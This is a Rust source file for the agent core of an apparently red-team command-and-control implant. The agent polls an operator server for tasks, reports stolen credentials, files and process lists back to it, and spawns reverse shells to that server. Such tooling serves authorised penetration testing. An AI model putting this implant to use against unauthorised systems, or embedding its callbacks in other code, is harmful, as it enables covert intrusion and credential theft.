use anyhow::{Context, Result};
use eldritch_libagent::agent::Agent;
use pb::c2::{self, ClaimTasksRequest};
use pb::config::Config;
use std::collections::BTreeMap;
use std::sync::{Arc, Mutex};
use tokio::sync::RwLock;
use transport::Transport;

use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
use crate::task::TaskRegistry;

pub struct ImixAgent<T: Transport> {
    config: Arc<RwLock<Config>>,
    pub transport: Arc<RwLock<T>>,
    runtime_handle: tokio::runtime::Handle,
    pub task_registry: TaskRegistry,
    pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
}

impl<T: Transport> Clone for ImixAgent<T> {
    fn clone(&self) -> Self {
        Self {
            config: self.config.clone(),
            transport: self.transport.clone(),
            runtime_handle: self.runtime_handle.clone(),
            task_registry: self.task_registry.clone(),
            subtasks: self.subtasks.clone(),
        }
    }
}

impl<T: Transport + 'static> ImixAgent<T> {
    pub fn new(
        config: Config,
        transport: T,
        runtime_handle: tokio::runtime::Handle,
        task_registry: TaskRegistry,
    ) -> Self {
        Self {
            config: Arc::new(RwLock::new(config)),
            transport: Arc::new(RwLock::new(transport)),
            runtime_handle,
            task_registry,
            subtasks: Arc::new(Mutex::new(BTreeMap::new())),
        }
    }

    pub fn get_callback_interval_u64(&self) -> u64 {
        // Blocks on read, but it's fast
        if let Ok(cfg) = self.config.try_read() {
            cfg.info.as_ref().map(|b| b.interval).unwrap_or(5)
        } else {
            5
        }
    }

    // Helper to fetch tasks and return them, so main can spawn
    pub async fn fetch_tasks(&self) -> Result<Vec<pb::c2::Task>> {
        let mut transport = self.transport.write().await;
        let beacon_info = self.config.read().await.info.clone();
        let req = ClaimTasksRequest {
            beacon: beacon_info,
        };
        let response = transport
            .claim_tasks(req)
            .await
            .context("Failed to claim tasks")?;
        Ok(response.tasks)
    }

    // Helper to run a future on the runtime handle, blocking the current thread.
    fn block_on<F, R>(&self, future: F) -> Result<R, String>
    where
        F: std::future::Future<Output = Result<R, String>>,
    {
        self.runtime_handle.block_on(future)
    }
}

// Implement the Eldritch Agent Trait
impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
    fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
        self.block_on(async {
            let mut t = self.transport.write().await;
            // Transport uses std::sync::mpsc::Sender for fetch_asset
            let (tx, rx) = std::sync::mpsc::channel();
            t.fetch_asset(req, tx).await.map_err(|e| e.to_string())?;

            let mut data = Vec::new();
            while let Ok(resp) = rx.recv() {
                data.extend(resp.chunk);
            }
            Ok(data)
        })
    }

    fn report_credential(
        &self,
        req: c2::ReportCredentialRequest,
    ) -> Result<c2::ReportCredentialResponse, String> {
        self.block_on(async {
            let mut t = self.transport.write().await;
            t.report_credential(req).await.map_err(|e| e.to_string())
        })
    }

    fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse, String> {
        self.block_on(async {
            let mut t = self.transport.write().await;
            // Transport uses std::sync::mpsc::Receiver for report_file
            let (tx, rx) = std::sync::mpsc::channel();
            tx.send(req).map_err(|e| e.to_string())?;
            drop(tx);
            t.report_file(rx).await.map_err(|e| e.to_string())
        })
    }

    fn report_process_list(
        &self,
        req: c2::ReportProcessListRequest,
    ) -> Result<c2::ReportProcessListResponse, String> {
        self.block_on(async {
            let mut t = self.transport.write().await;
            t.report_process_list(req).await.map_err(|e| e.to_string())
        })
    }

    fn report_task_output(
        &self,
        req: c2::ReportTaskOutputRequest,
    ) -> Result<c2::ReportTaskOutputResponse, String> {
        self.block_on(async {
            let mut t = self.transport.write().await;
            t.report_task_output(req).await.map_err(|e| e.to_string())
        })
    }

    fn reverse_shell(&self) -> Result<(), String> {
        Err("Reverse shell not implemented in imixv2 agent yet".to_string())
    }

    fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
        let subtasks = self.subtasks.clone();

        // We need to clone the transport to move it into the spawned task.
        // Since we are in a synchronous context, we use block_on to acquire the async lock.
        let transport_clone = self.block_on(async {
            let guard = self.transport.read().await;
            Ok(guard.clone())
        })?;

        let handle = self.runtime_handle.spawn(async move {
            if let Err(_e) = run_reverse_shell_pty(task_id, cmd, transport_clone).await {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty error: {}", _e);
            }
        });

        // Store handle
        if let Ok(mut map) = subtasks.lock() {
            map.insert(task_id, handle);
        }

        Ok(())
    }

    fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String> {
        let subtasks = self.subtasks.clone();

        let agent_clone = self.clone();

        let handle = self.runtime_handle.spawn(async move {
            if let Err(_e) = run_repl_reverse_shell(task_id, agent_clone).await {
                #[cfg(debug_assertions)]
                log::error!("repl_reverse_shell error: {}", _e);
            }
        });

        if let Ok(mut map) = subtasks.lock() {
            map.insert(task_id, handle);
        }

        Ok(())
    }

    fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
        self.block_on(async {
            let mut t = self.transport.write().await;
            t.claim_tasks(req).await.map_err(|e| e.to_string())
        })
    }

    fn get_transport(&self) -> Result<String, String> {
        Ok("grpc".to_string())
    }

    fn set_transport(&self, _transport: String) -> Result<(), String> {
        Err("Switching transport not supported yet".to_string())
    }

    fn add_transport(&self, _transport: String, _config: String) -> Result<(), String> {
        Err("Adding transport not supported yet".to_string())
    }

    fn list_transports(&self) -> Result<Vec<String>, String> {
        Ok(vec!["grpc".to_string()])
    }

    fn get_callback_interval(&self) -> Result<u64, String> {
        Ok(self.get_callback_interval_u64())
    }

    fn set_callback_interval(&self, interval: u64) -> Result<(), String> {
        self.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = &mut cfg.info {
                info.interval = interval;
            }
            Ok(())
        })
    }

    fn list_tasks(&self) -> Result<Vec<c2::Task>, String> {
        Ok(self.task_registry.list())
    }

    fn stop_task(&self, task_id: i64) -> Result<(), String> {
        self.task_registry.stop(task_id);
        // Also stop subtask
        let mut map = self.subtasks.lock().map_err(|_| "Poisoned lock".to_string())?;
        if let Some(handle) = map.remove(&task_id) {
             handle.abort();
             #[cfg(debug_assertions)]
             log::info!("Aborted subtask {}", task_id);
        }
        Ok(())
    }
}
